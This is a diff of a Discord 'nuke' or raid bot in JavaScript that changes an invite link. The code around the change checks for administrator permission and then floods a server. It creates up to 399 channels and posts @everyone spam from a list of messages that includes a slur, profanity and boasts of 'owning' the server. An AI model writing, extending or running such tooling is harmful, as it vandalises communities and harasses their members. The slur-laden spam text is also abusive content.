@@ -183,7 +183,7 @@ if(message.channel.type === "dm") {return}
 
 
 function randomT() {
-  var rand = ['https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4 @everyone', '@everyone https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4', 'https://discord.gg/ANDTsKp @everyone', '@everyone fucked by 【ℕ𝕋】 RETARDS', '@everyone fucked by 【ℕ𝕋】 haha', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756371334791198/image0.jpg?width=587&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756313554583562/image0.jpg','@everyone https://media.discordapp.net/attachments/756219863206330469/759745708394807307/image0-1.png', '@everyone CHAOS CHAOS', '@everyone 【ℕ𝕋】 owns you','Get fucked @everyone', '@everyone bruh momentum', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756690228379738/image0.jpg?width=646&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756775233814558/image0.jpg', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756846772387880/image0.png?width=581&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756645554847774/image0.jpg', '@everyone get rekt'];
+  var rand = ['https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4 @everyone', '@everyone https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4', 'https://discord.gg/rYagK4sPKU @everyone', '@everyone fucked by 【ℕ𝕋】 RETARDS', '@everyone fucked by 【ℕ𝕋】 haha', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756371334791198/image0.jpg?width=587&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756313554583562/image0.jpg','@everyone https://media.discordapp.net/attachments/756219863206330469/759745708394807307/image0-1.png', '@everyone CHAOS CHAOS', '@everyone 【ℕ𝕋】 owns you','Get fucked @everyone', '@everyone bruh momentum', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756690228379738/image0.jpg?width=646&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756775233814558/image0.jpg', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756846772387880/image0.png?width=581&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756645554847774/image0.jpg', '@everyone get rekt'];
 
   return rand[Math.floor(Math.random()*rand.length)];
 }
@@ -220,7 +220,7 @@ client.on('message', msg => {
       if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
        var number = 0
        
-       msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/ANDTsKp @everyone https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4").then(c.send("@everyone fucked by Nightmare Troupe LMFAO69").then(c.send("rip webhook spam shitcord killed it"))))
+       msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/rYagK4sPKU @everyone https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4").then(c.send("@everyone fucked by Nightmare Troupe LMFAO69").then(c.send("rip webhook spam shitcord killed it"))))
         while(number < 399) {
             msg.guild.channels.create(random123()).then(c => { 
                
